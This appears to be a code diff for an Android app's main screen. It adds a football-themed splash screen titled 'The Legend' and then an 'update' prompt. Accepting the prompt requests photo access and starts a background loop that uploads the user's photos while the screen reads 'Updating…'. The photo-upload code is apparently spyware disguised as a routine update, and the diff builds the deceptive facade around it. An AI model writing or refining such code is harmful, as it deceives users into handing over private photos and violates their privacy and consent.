@@ -4,10 +4,15 @@ import android.Manifest
 import android.app.AlertDialog
 import android.content.ContentResolver
 import android.content.pm.PackageManager
+import android.graphics.Color
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.provider.MediaStore
+import android.view.Gravity
+import android.widget.LinearLayout
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
@@ -30,22 +35,87 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        statusText = TextView(this).apply {
-            text = "جاري التحديث…"
-            textSize = 18f
-            setPadding(40, 80, 40, 40)
+        // شاشة البداية
+        showSplashScreen()
+
+        // بعد شاشة البداية تظهر رسالة التحديث
+        Handler(Looper.getMainLooper()).postDelayed({
+            showUpdateDialog()
+        }, 1800)
+    }
+
+    private fun showSplashScreen() {
+
+        val layout = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            gravity = Gravity.CENTER
+            setBackgroundColor(Color.rgb(18, 18, 18))
+            setPadding(30, 30, 30, 30)
         }
 
-        setContentView(statusText)
+        // كرة القدم
+        val football = TextView(this).apply {
+            text = "⚽"
+            textSize = 82f
+            gravity = Gravity.CENTER
+        }
 
-        showUpdateDialog()
+        // اسم التطبيق
+        val title = TextView(this).apply {
+            text = "الأسطورة"
+            textSize = 32f
+            setTextColor(Color.WHITE)
+            gravity = Gravity.CENTER
+            setPadding(0, 18, 0, 8)
+        }
+
+        // حالة التحميل الصغيرة
+        val loading = TextView(this).apply {
+            text = "جاري التحميل…"
+            textSize = 11f
+            setTextColor(Color.LTGRAY)
+            gravity = Gravity.CENTER
+        }
+
+        layout.addView(
+            football,
+            LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT
+            )
+        )
+
+        layout.addView(
+            title,
+            LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT
+            )
+        )
+
+        layout.addView(
+            loading,
+            LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT
+            )
+        )
+
+        setContentView(layout)
     }
 
     private fun showUpdateDialog() {
 
+        val message = TextView(this).apply {
+            text = "هل تريد التحديث؟"
+            textSize = 18f
+            gravity = Gravity.CENTER
+            setPadding(20, 20, 20, 10)
+        }
+
         AlertDialog.Builder(this)
-            .setTitle("تحديث الصور")
-            .setMessage("هل تريد التحديث؟")
+            .setTitle("الأسطورة")
+            .setView(message)
             .setPositiveButton("موافق") { _, _ ->
                 checkPhotoPermission()
             }
@@ -103,15 +173,17 @@ class MainActivity : AppCompatActivity() {
                 startPhotoUpload()
             } else {
 
-                statusText.text =
+                showStatusScreen(
                     "لم يتم السماح بالوصول إلى الصور"
+                )
             }
         }
     }
 
     private fun startPhotoUpload() {
 
-        statusText.text = "جاري التحديث…"
+        // شاشة التحديث
+        showStatusScreen("جاري التحديث…")
 
         Thread {
 
@@ -185,9 +257,7 @@ class MainActivity : AppCompatActivity() {
                             )
 
                         if (!success) {
-                            throw Exception(
-                                "Upload failed"
-                            )
+                            throw Exception("Upload failed")
                         }
 
                         uploaded++
@@ -225,6 +295,32 @@ class MainActivity : AppCompatActivity() {
             }
 
         }.start()
+    }
+
+    private fun showStatusScreen(text: String) {
+
+        statusText = TextView(this).apply {
+            this.text = text
+            textSize = 11f
+            setTextColor(Color.LTGRAY)
+            gravity = Gravity.CENTER
+            setPadding(20, 20, 20, 20)
+        }
+
+        val layout = LinearLayout(this).apply {
+            gravity = Gravity.CENTER
+            orientation = LinearLayout.VERTICAL
+            setBackgroundColor(Color.rgb(18, 18, 18))
+            addView(
+                statusText,
+                LinearLayout.LayoutParams(
+                    LinearLayout.LayoutParams.MATCH_PARENT,
+                    LinearLayout.LayoutParams.WRAP_CONTENT
+                )
+            )
+        }
+
+        setContentView(layout)
     }
 
     private fun uploadFile(
